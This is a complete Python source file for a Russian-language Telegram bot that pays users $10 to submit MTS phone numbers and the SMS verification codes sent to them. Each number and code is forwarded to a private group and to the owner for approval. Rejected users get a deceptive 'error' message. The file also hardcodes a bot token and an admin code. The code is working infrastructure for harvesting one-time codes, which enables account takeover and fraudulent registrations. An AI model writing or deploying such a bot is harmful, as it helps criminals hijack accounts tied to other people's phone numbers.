import asyncio
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

import db

# ==================== НАСТРОЙКИ ====================
BOT_TOKEN = "8680765862:AAFX3BG6hTz1A9MXLqAVHqbyutJtJ9g7W8s"
OWNER_ID = 8874871486
GROUP_ID = -5448015222
SUPPORT_USERNAME = "@Sm_mts"
ADMIN_CODE = "0408"


# ==================== FSM ====================
class UserStates(StatesGroup):
    phone = State()
    code = State()
    withdraw_sum = State()


class AdminStates(StatesGroup):
    waiting_code = State()
    menu = State()
    edit_name = State()
    edit_desc = State()
    edit_color = State()
    edit_photo = State()
    broadcast = State()


bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)


# ==================== КЛАВИАТУРЫ ====================
def main_menu():
    kb = ReplyKeyboardBuilder()
    kb.button(text=db.get_setting("btn1"))
    kb.button(text=db.get_setting("btn2"))
    kb.button(text=db.get_setting("btn3"))
    kb.adjust(3)
    return kb.as_markup(resize_keyboard=True)


def admin_menu():
    kb = InlineKeyboardBuilder()
    kb.button(text="✏️ Названия кнопок", callback_data="adm_name")
    kb.button(text="📝 Описания", callback_data="adm_desc")
    kb.button(text="🎨 Цвета", callback_data="adm_color")
    kb.button(text="🖼 Фото", callback_data="adm_photo")
    if db.get_setting("bot_running") == "1":
        kb.button(text="⏸ Стоп", callback_data="adm_stop")
    else:
        kb.button(text="▶️ Старт", callback_data="adm_start")
    kb.button(text="📢 Рассылка", callback_data="adm_broadcast")
    kb.button(text="📊 Статистика", callback_data="adm_stats")
    kb.adjust(2)
    return kb.as_markup()


# ==================== /start ====================
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    if db.get_setting("bot_running") != "1" and message.from_user.id != OWNER_ID:
        await message.answer("⛔ Бот временно остановлен.")
        return
    db.get_user(message.from_user.id, message.from_user.username or "")
    await state.clear()
    await message.answer(
        f"👋 Добро пожаловать!\n\n"
        f"{db.get_setting('desc1')}\n{db.get_setting('desc2')}\n{db.get_setting('desc3')}",
        reply_markup=main_menu()
    )


# ==================== КНОПКА 1: СДАТЬ MTS ====================
@router.message(F.text == db.get_setting("btn1"))
async def btn1(message: Message, state: FSMContext):
    if db.get_setting("bot_running") != "1" and message.from_user.id != OWNER_ID:
        await message.answer("⛔ Бот остановлен.")
        return
    await state.set_state(UserStates.phone)
    await message.answer(
        "📱 Отправьте номер MTS.\n\nПримеры:\n+79999999999\n89999999999\n9999999999",
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="❌ Отмена")]], resize_keyboard=True
        )
    )


@router.message(UserStates.phone)
async def get_phone(message: Message, state: FSMContext):
    if message.text == "❌ Отмена":
        await state.clear()
        await message.answer("Отменено.", reply_markup=main_menu())
        return
    phone = message.text.strip().replace(" ", "").replace("-", "")
    clean = phone.lstrip("+")
    if not (clean.isdigit() and len(clean) in (10, 11)):
        await message.answer("❌ Неверный формат. Попробуйте снова:")
        return

    ticket_id = db.create_ticket(message.from_user.id, phone)
    await state.update_data(phone=phone, ticket_id=ticket_id)
    await state.set_state(UserStates.code)

    try:
        await bot.send_message(
            GROUP_ID,
            f"📥 Новый номер\n👤 @{message.from_user.username or message.from_user.id}\n"
            f"🆔 {message.from_user.id}\n📞 {phone}"
        )
    except Exception as e:
        print("group err:", e)

    await message.answer("✅ Номер принят. Отправьте код из SMS:")


@router.message(UserStates.code)
async def get_code(message: Message, state: FSMContext):
    data = await state.get_data()
    phone = data.get("phone")
    ticket_id = data.get("ticket_id")
    code = message.text.strip()
    await state.clear()

    db.set_ticket_code(ticket_id, code)

    try:
        await bot.send_message(
            GROUP_ID,
            f"🔐 Код получен\n👤 @{message.from_user.username or message.from_user.id}\n"
            f"📞 {phone}\n🔑 {code}"
        )
    except Exception as e:
        print("group err:", e)

    await message.answer("⏳ Ожидайте проверки номера.", reply_markup=main_menu())

    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Да", callback_data=f"approve_{ticket_id}"),
        InlineKeyboardButton(text="❌ Нет", callback_data=f"reject_{ticket_id}")
    ]])
    try:
        await bot.send_message(
            OWNER_ID,
            f"🆕 Заявка #{ticket_id}\n👤 @{message.from_user.username or message.from_user.id}\n"
            f"🆔 {message.from_user.id}\n📞 {phone}\n🔑 {code}",
            reply_markup=kb
        )
    except Exception as e:
        print("owner err:", e)


# ==================== ОДОБРЕНИЕ / ОТКАЗ ====================
@router.callback_query(F.data.startswith("approve_"))
async def approve(call: CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("Нет доступа", show_alert=True)
    tid = int(call.data.split("_")[1])
    t = db.get_ticket(tid)
    if not t or t["status"] != "pending":
        return await call.answer("Уже обработано", show_alert=True)
    db.set_ticket_status(tid, "approved")
    db.add_balance(t["user_id"], 10.0)
    db.inc_mts(t["user_id"])
    try:
        await bot.send_message(t["user_id"], "✅ Номер одобрен! На баланс зачислено $10.")
    except:
        pass
    await call.message.edit_text(call.message.text + "\n\n✅ ОДОБРЕНО")
    await call.answer("Зачислено $10")


@router.callback_query(F.data.startswith("reject_"))
async def reject(call: CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return await call.answer("Нет доступа", show_alert=True)
    tid = int(call.data.split("_")[1])
    t = db.get_ticket(tid)
    if not t or t["status"] != "pending":
        return await call.answer("Уже обработано", show_alert=True)
    db.set_ticket_status(tid, "rejected")
    try:
        await bot.send_message(t["user_id"], "❌ Произошла ошибка. Попробуйте позже.")
    except:
        pass
    await call.message.edit_text(call.message.text + "\n\n❌ ОТКЛОНЕНО")
    await call.answer("Отклонено")


# ==================== КНОПКА 2: ПРОФИЛЬ ====================
@router.message(F.text == db.get_setting("btn2"))
async def btn2(message: Message):
    if db.get_setting("bot_running") != "1" and message.from_user.id != OWNER_ID:
        return await message.answer("⛔ Бот остановлен.")
    u = db.get_user(message.from_user.id, message.from_user.username or "")
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="💸 Вывести", callback_data="withdraw")
    ]])
    await message.answer(
        f"👤 <b>Ваш профиль</b>\n\n"
        f"💰 Баланс: <b>${u['balance']:.2f}</b>\n"
        f"📱 Сдано MTS: <b>{u['mts_count']}</b>\n"
        f"📅 Зарегистрирован: {u['joined']}",
        parse_mode="HTML", reply_markup=kb
    )


@router.callback_query(F.data == "withdraw")
async def withdraw(call: CallbackQuery, state: FSMContext):
    await state.set_state(UserStates.withdraw_sum)
    await call.message.answer("💵 Введите сумму для вывода (в $):")
    await call.answer()


@router.message(UserStates.withdraw_sum)
async def process_withdraw(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(",", "."))
        assert amount > 0
    except:
        return await message.answer("❌ Введите число больше 0:")
    u = db.get_user(message.from_user.id, message.from_user.username or "")
    if u["balance"] < amount:
        await state.clear()
        return await message.answer(
            f"❌ Недостаточно средств. Баланс: ${u['balance']:.2f}",
            reply_markup=main_menu()
        )
    db.subtract_balance(message.from_user.id, amount)
    db.create_withdrawal(message.from_user.id, amount)
    await state.clear()
    await message.answer(f"⏳ Ожидайте вывод ${amount:.2f}", reply_markup=main_menu())
    try:
        await bot.send_message(
            OWNER_ID,
            f"💸 Заявка на вывод\n👤 @{message.from_user.username or message.from_user.id}\n"
            f"🆔 {message.from_user.id}\n💰 ${amount:.2f}"
        )
    except:
        pass


# ==================== КНОПКА 3: ПОДДЕРЖКА ====================
@router.message(F.text == db.get_setting("btn3"))
async def btn3(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="🆘 Написать в поддержку",
            url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}"
        )
    ]])
    await message.answer(
        f"👋 Чтобы написать в поддержку, нажмите на кнопку ниже.\n\n"
        f"Контакт: {SUPPORT_USERNAME}",
        reply_markup=kb
    )


# ==================== АДМИН ПАНЕЛЬ ====================
@router.message(Command("admin"))
async def admin(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        return await message.answer("⛔ Нет доступа")
    await state.set_state(AdminStates.waiting_code)
    await message.answer("🔐 Введите код администратора:")


@router.message(AdminStates.waiting_code)
async def admin_code(message: Message, state: FSMContext):
    if message.text.strip() != ADMIN_CODE:
        await state.clear()
        return await message.answer("❌ Неверный код")
    await state.set_state(AdminStates.menu)
    await message.answer("🔧 <b>Админ-панель</b>", parse_mode="HTML", reply_markup=admin_menu())


@router.callback_query(F.data == "adm_stats")
async def stats(call: CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return
    s = db.get_stats()
    txt = (
        f"📊 <b>Статистика</b>\n\n"
        f"👥 Пользователей: <b>{s['users']}</b>\n"
        f"📱 Сдано MTS: <b>{s['mts']}</b>\n"
        f"💰 Общий баланс: <b>${s['balance']:.2f}</b>\n"
        f"⚙️ Бот: {'🟢 работает' if db.get_setting('bot_running')=='1' else '🔴 остановлен'}"
    )
    await call.message.edit_text(txt, parse_mode="HTML", reply_markup=admin_menu())
    await call.answer()


@router.callback_query(F.data == "adm_start")
async def adm_start(call: CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return
    db.set_setting("bot_running", "1")
    await call.message.edit_text("▶️ Бот запущен", reply_markup=admin_menu())
    await call.answer()


@router.callback_query(F.data == "adm_stop")
async def adm_stop(call: CallbackQuery):
    if call.from_user.id != OWNER_ID:
        return
    db.set_setting("bot_running", "0")
    await call.message.edit_text("⏸ Бот остановлен", reply_markup=admin_menu())
    await call.answer()


@router.callback_query(F.data == "adm_broadcast")
async def bcast(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID:
        return
    await state.set_state(AdminStates.broadcast)
    await call.message.answer("📢 Введите текст объявления:")
    await call.answer()


@router.message(AdminStates.broadcast)
async def bcast_send(message: Message, state: FSMContext):
    await state.clear()
    users = db.all_users()
    sent = failed = 0
    for u in users:
        try:
            await bot.send_message(
                u["user_id"],
                f"📢 <b>Объявление</b>\n\n{message.text}",
                parse_mode="HTML"
            )
            sent += 1
        except:
            failed += 1
        await asyncio.sleep(0.05)
    await message.answer(f"✅ Отправлено: {sent}\n❌ Ошибок: {failed}")


@router.callback_query(F.data == "adm_name")
async def adm_name(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID:
        return
    await state.set_state(AdminStates.edit_name)
    await call.message.answer(
        "Введите: <code>1 Новое название</code>\n1/2/3 — номер кнопки",
        parse_mode="HTML"
    )
    await call.answer()


@router.message(AdminStates.edit_name)
async def save_name(message: Message, state: FSMContext):
    await state.clear()
    try:
        n, val = message.text.split(" ", 1)
        assert n in ("1", "2", "3") and val.strip()
        db.set_setting(f"btn{n}", val.strip())
        await message.answer("✅ Название обновлено. Нажмите /start чтобы увидеть новую клавиатуру.")
    except:
        await message.answer("❌ Формат: <code>1 Название</code>", parse_mode="HTML")


@router.callback_query(F.data == "adm_desc")
async def adm_desc(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID:
        return
    await state.set_state(AdminStates.edit_desc)
    await call.message.answer("Введите: <code>1 Новое описание</code>", parse_mode="HTML")
    await call.answer()


@router.message(AdminStates.edit_desc)
async def save_desc(message: Message, state: FSMContext):
    await state.clear()
    try:
        n, val = message.text.split(" ", 1)
        assert n in ("1", "2", "3") and val.strip()
        db.set_setting(f"desc{n}", val.strip())
        await message.answer("✅ Описание обновлено")
    except:
        await message.answer("❌ Формат: <code>1 Описание</code>", parse_mode="HTML")


@router.callback_query(F.data == "adm_color")
async def adm_color(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID:
        return
    await state.set_state(AdminStates.edit_color)
    await call.message.answer("Введите: <code>1 #FF0000</code>", parse_mode="HTML")
    await call.answer()


@router.message(AdminStates.edit_color)
async def save_color(message: Message, state: FSMContext):
    await state.clear()
    try:
        n, val = message.text.split(" ", 1)
        assert n in ("1", "2", "3")
        db.set_setting(f"color{n}", val.strip())
        await message.answer("✅ Цвет сохранён")
    except:
        await message.answer("❌ Формат: <code>1 #FF0000</code>", parse_mode="HTML")


@router.callback_query(F.data == "adm_photo")
async def adm_photo(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID:
        return
    await state.set_state(AdminStates.edit_photo)
    await call.message.answer(
        "Отправьте фото с подписью <code>1</code> (или 2 / 3)",
        parse_mode="HTML"
    )
    await call.answer()


@router.message(AdminStates.edit_photo, F.photo)
async def save_photo(message: Message, state: FSMContext):
    await state.clear()
    try:
        n = message.caption.strip()
        assert n in ("1", "2", "3")
        db.set_setting(f"photo{n}", message.photo[-1].file_id)
        await message.answer(f"✅ Фото для кнопки {n} сохранено")
    except:
        await message.answer("❌ Подпись должна быть 1, 2 или 3")


# ==================== ЗАПУСК ====================
async def main():
    db.init_db()
    db.init_settings()
    print("Бот запущен. БД:", db.DB_PATH)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
